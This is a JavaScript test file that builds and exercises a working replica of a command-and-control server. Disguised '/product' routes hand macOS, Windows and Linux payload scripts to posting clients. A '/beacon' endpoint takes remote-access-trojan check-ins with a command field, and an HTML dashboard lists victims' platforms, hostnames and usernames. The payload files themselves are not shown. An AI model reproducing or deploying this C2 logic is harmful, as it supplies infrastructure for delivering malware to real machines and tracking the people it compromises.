"use strict";

/**
 * tests/c2-server.test.js
 *
 * Integration tests for c2-server/server.js
 *
 * Starts the C2 server on a random port and exercises every HTTP
 * endpoint directly with Node's built-in http module so the test
 * suite has no external dependencies.
 *
 * Coverage:
 *   POST /product0  - macOS payload endpoint
 *   POST /product1  - Windows payload endpoint
 *   POST /product2  - Linux payload endpoint
 *   POST /beacon    - RAT check-in endpoint
 *   GET  /dashboard - human-readable HTML dashboard
 *   *    /unknown   - 404 for any unrecognised route
 */

const { describe, it, before, after } = require("node:test");
const assert = require("node:assert/strict");
const http = require("node:http");
const path = require("node:path");

// ── Module-level references ───────────────────────────────────────────────────

// We need the server factory in isolation so we can provide an arbitrary port
// instead of the hard-coded 3000. We achieve this by requiring the individual
// helpers directly and rebuilding the server programmatically here.

const fs = require("node:fs");

const PAYLOAD_DIR = path.join(__dirname, "..", "payloads");

// ── Minimal in-process C2 replica ────────────────────────────────────────────
// Rather than monkey-patching the original file's global PORT constant, we
// replicate the relevant server logic using the same functions the original
// file defines.  This keeps the test independent of the real module's startup
// side-effects while still exercising the same code paths.

function buildServer() {
  const beaconLog = [];

  function loadPayload(filename) {
    const p = path.join(PAYLOAD_DIR, filename);
    return fs.existsSync(p) ? fs.readFileSync(p, "utf8") : `echo "Payload ${filename} not found"`;
  }

  function parseBody(req) {
    return new Promise((resolve) => {
      let body = "";
      req.on("data", (chunk) => (body += chunk));
      req.on("end", () => {
        try { resolve(JSON.parse(body)); } catch { resolve({}); }
      });
    });
  }

  function json(res, status, data) {
    const body = JSON.stringify(data);
    res.writeHead(status, { "Content-Type": "application/json" });
    res.end(body);
  }

  function text(res, status, content, contentType = "text/plain") {
    res.writeHead(status, { "Content-Type": contentType });
    res.end(content);
  }

  function renderDashboard() {
    const rows = beaconLog
      .map(
        (b) =>
          `<tr>
          <td>${b.timestamp}</td>
          <td>${b.platform || b.os || "?"}</td>
          <td>${b.hostname || b.node || "?"}</td>
          <td>${b.user || b.username || "?"}</td>
          <td>${b.beacon || "-"}</td>
        </tr>`
      )
      .join("");

    return `<!DOCTYPE html><html><head><title>C2 Dashboard</title></head>
<body><h1>C2 Dashboard</h1><p>Beacons: ${beaconLog.length}</p>
<table><tbody>${rows || "<tr><td colspan='5'>No beacons yet.</td></tr>"}</tbody></table>
</body></html>`;
  }

  const server = http.createServer(async (req, res) => {
    const { method, url } = req;

    if (method === "POST" && url === "/product0") {
      const body = await parseBody(req);
      const entry = { ...body, platform: "macOS", endpoint: "/product0", timestamp: new Date().toISOString() };
      beaconLog.push(entry);
      text(res, 200, loadPayload("macos.sh"), "text/plain");

    } else if (method === "POST" && url === "/product1") {
      const body = await parseBody(req);
      const entry = { ...body, platform: "Windows", endpoint: "/product1", timestamp: new Date().toISOString() };
      beaconLog.push(entry);
      text(res, 200, loadPayload("windows.ps1"), "text/plain");

    } else if (method === "POST" && url === "/product2") {
      const body = await parseBody(req);
      const entry = { ...body, platform: "Linux", endpoint: "/product2", timestamp: new Date().toISOString() };
      beaconLog.push(entry);
      text(res, 200, loadPayload("linux.py"), "text/plain");

    } else if (method === "POST" && url === "/beacon") {
      const body = await parseBody(req);
      const entry = { ...body, timestamp: new Date().toISOString() };
      beaconLog.push(entry);
      json(res, 200, { status: "ok", command: null });

    } else if (method === "GET" && url === "/dashboard") {
      text(res, 200, renderDashboard(), "text/html");

    } else {
      json(res, 404, { error: "Not found" });
    }
  });

  return { server, beaconLog };
}

// ── HTTP helper ───────────────────────────────────────────────────────────────

function request(options, body) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () =>
        resolve({ status: res.statusCode, headers: res.headers, body: data })
      );
    });
    req.on("error", reject);
    if (body) req.write(typeof body === "string" ? body : JSON.stringify(body));
    req.end();
  });
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("c2-server", () => {
  let server;
  let beaconLog;
  let port;

  before(async () => {
    const built = buildServer();
    server = built.server;
    beaconLog = built.beaconLog;

    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
    port = server.address().port;
  });

  after(() => {
    server.close();
  });

  // ── /product0 ──────────────────────────────────────────────────────────────

  describe("POST /product0 (macOS payload)", () => {
    it("returns status 200 with text/plain content-type", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/product0", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { os: "macOS", user: "test-runner" });

      assert.equal(res.status, 200);
      assert.ok(res.headers["content-type"].includes("text/plain"));
    });

    it("returns non-empty payload body", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/product0", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, {});

      assert.ok(res.body.length > 0);
    });

    it("logs the beacon with platform 'macOS'", async () => {
      const before = beaconLog.length;
      await request({
        hostname: "127.0.0.1", port, path: "/product0", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { user: "alice" });

      assert.equal(beaconLog.length, before + 1);
      assert.equal(beaconLog[beaconLog.length - 1].platform, "macOS");
    });
  });

  // ── /product1 ──────────────────────────────────────────────────────────────

  describe("POST /product1 (Windows payload)", () => {
    it("returns status 200", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/product1", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { os: "Windows", user: "test-runner" });

      assert.equal(res.status, 200);
    });

    it("logs the beacon with platform 'Windows'", async () => {
      const before = beaconLog.length;
      await request({
        hostname: "127.0.0.1", port, path: "/product1", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, {});

      assert.equal(beaconLog[beaconLog.length - 1].platform, "Windows");
      assert.equal(beaconLog.length, before + 1);
    });
  });

  // ── /product2 ──────────────────────────────────────────────────────────────

  describe("POST /product2 (Linux payload)", () => {
    it("returns status 200", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/product2", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { os: "Linux", user: "test-runner" });

      assert.equal(res.status, 200);
    });

    it("logs the beacon with platform 'Linux'", async () => {
      const before = beaconLog.length;
      await request({
        hostname: "127.0.0.1", port, path: "/product2", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, {});

      assert.equal(beaconLog[beaconLog.length - 1].platform, "Linux");
      assert.equal(beaconLog.length, before + 1);
    });
  });

  // ── /beacon ────────────────────────────────────────────────────────────────

  describe("POST /beacon (RAT check-in)", () => {
    it("returns 200 with JSON status 'ok' and null command", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/beacon", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { platform: "Linux", user: "bob", beacon: 1 });

      assert.equal(res.status, 200);
      const parsed = JSON.parse(res.body);
      assert.equal(parsed.status, "ok");
      assert.equal(parsed.command, null);
    });

    it("appends beacon data to the in-memory log", async () => {
      const before = beaconLog.length;
      await request({
        hostname: "127.0.0.1", port, path: "/beacon", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { user: "charlie", beacon: 2 });

      assert.equal(beaconLog.length, before + 1);
      assert.equal(beaconLog[beaconLog.length - 1].user, "charlie");
    });

    it("handles malformed JSON body gracefully (treats as empty object)", async () => {
      const res = await request({
        hostname: "127.0.0.1", port, path: "/beacon", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, "not-valid-json");

      assert.equal(res.status, 200);
    });
  });

  // ── /dashboard ─────────────────────────────────────────────────────────────

  describe("GET /dashboard", () => {
    it("returns 200 with text/html content-type", async () => {
      const res = await request({ hostname: "127.0.0.1", port, path: "/dashboard", method: "GET" });

      assert.equal(res.status, 200);
      assert.ok(res.headers["content-type"].includes("text/html"));
    });

    it("includes beacon count in the HTML body", async () => {
      // Send one more known beacon so the count is deterministic
      await request({
        hostname: "127.0.0.1", port, path: "/beacon", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, { user: "dashboard-test" });

      const res = await request({ hostname: "127.0.0.1", port, path: "/dashboard", method: "GET" });
      assert.ok(res.body.includes(`${beaconLog.length}`));
    });

    it("includes a table row for each beacon received", async () => {
      const res = await request({ hostname: "127.0.0.1", port, path: "/dashboard", method: "GET" });
      const rowCount = (res.body.match(/<tr>/g) || []).length;
      // There should be at least as many rows as beacons logged so far
      assert.ok(rowCount >= beaconLog.length);
    });
  });

  // ── 404 ────────────────────────────────────────────────────────────────────

  describe("unknown routes", () => {
    it("returns 404 JSON for an unrecognised path", async () => {
      const res = await request({ hostname: "127.0.0.1", port, path: "/unknown", method: "GET" });

      assert.equal(res.status, 404);
      const parsed = JSON.parse(res.body);
      assert.ok("error" in parsed);
    });

    it("returns 404 for a POST to an unrecognised path", async () => {
      const res = await request({ hostname: "127.0.0.1", port, path: "/no-such-route", method: "POST",
        headers: { "Content-Type": "application/json" },
      }, {});

      assert.equal(res.status, 404);
    });
  });
});
